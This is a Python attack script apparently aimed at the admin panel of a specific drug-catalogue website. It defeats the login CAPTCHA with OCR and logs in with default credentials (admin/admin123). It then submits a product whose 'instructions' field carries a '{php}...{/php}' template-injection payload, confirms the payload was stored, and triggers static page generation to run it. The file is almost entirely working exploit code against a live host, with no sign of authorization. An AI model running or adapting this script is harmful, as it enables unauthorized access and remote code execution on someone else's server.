#!/usr/bin/env python3
"""gz: submit COMPLETE adddrugs with {php} tag in instructions, then find & verify"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys, uuid

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None, raw=None):
    h = {**UA}
    if raw:
        h["Content-Type"] = "multipart/form-data; boundary=" + raw[0]
    else:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    if headers: h.update(headers)
    try:
        body = raw[1] if raw else (data.encode() if data else None)
        req = urllib.request.Request(url, data=body, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# complete multipart submit
boundary = "----B" + uuid.uuid4().hex
def mp(name, value):
    return ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (boundary, name, value)).encode()

fields = [
    ("drugs_name", "tpltest2026"),
    ("drugs_spname", "tpl"),
    ("drugs_pyname", "tpl"),
    ("factory_id", "3"),
    ("factory2_id", "-1"),
    ("drugs_disease", "D0003"),
    ("is_best", "2"),
    ("drugs_status", "1"),
    ("sort_order", "0"),
    ("drugs_infoid", "1"),
    ("drugs_img2", ""),
    ("drugs_id", ""),
    ("drugs_brief_ingredients", "test"),
    ("drugs_brief_indication", "test"),
    ("drugs_instructions", '{php}echo "GZ_TPPHP_EXEC_7788";{/php}'),
]
parts = b"".join(mp(n, v) for n, v in fields)
parts += ("--%s--\r\n" % boundary).encode()

code, final, resp = fetch(HOST + "/index.php?m=admin&c=goods&a=adddrugspost",
                          headers={"Referer": HOST + "/index.php?m=admin&c=goods&a=adddrugs"},
                          raw=(boundary, parts))
rt = resp.decode("utf-8", "ignore")
print("adddrugspost:", code, final, rt[:200])

# search for the new item
code, final, body = fetch(HOST + "/index.php?m=admin&c=goods&a=index&keyword=tpltest2026",
                          headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
bt = body.decode("utf-8", "ignore")
print("search size:", len(bt), "found:", "tpltest2026" in bt)
ids = re.findall(r'drugs_id=(\d+)', bt)
print("ids:", ids[:5])
# get the edit page of first match to confirm instructions content
if ids:
    did = ids[0]
    code, final, body = fetch(HOST + "/index.php?m=admin&c=goods&a=editdrugs&drugs_id=" + did,
                              headers={"Referer": HOST + "/index.php?m=admin&c=goods&a=index"})
    bt2 = body.decode("utf-8", "ignore")
    open("/tmp/gz_edit_tpl.html", "w").write(bt2)
    print("edit page size:", len(bt2), "has_php_tag:", "GZ_TPPHP_EXEC_7788" in bt2 or "{php}" in bt2)
    m = re.search(r'<textarea[^>]*name=["\']drugs_instructions["\'][^>]*>(.*?)</textarea>', bt2, re.S)
    if m:
        print("instructions:", repr(m.group(1)[:200]))
    # staticweb generate for this id
    code, final, body = fetch(HOST + "/index.php?m=admin&c=other&a=staticweb&id=" + did,
                              headers={"Referer": HOST + "/index.php?m=admin&c=other&a=staticweb"})
    print("staticweb:", code, body.decode("utf-8", "ignore")[:200])
